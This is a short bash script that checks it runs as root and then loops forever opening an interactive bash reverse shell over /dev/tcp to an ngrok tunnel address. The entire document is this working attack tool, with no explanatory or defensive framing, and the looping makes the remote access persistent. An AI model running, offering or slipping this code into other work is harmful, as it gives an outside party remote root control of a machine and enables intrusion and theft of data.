#!/bin/bash

echo "Checking root user."
if [ "$EUID" -ne 0 ]; then
	echo "The script must be run with the root user."
	exit 1
fi

export TERM=xterm-256color

echo "Reverse shell is starting..."
while true; do
	bash -i >&/dev/tcp/0.tcp.ap.ngrok.io/17827 0>&1
done
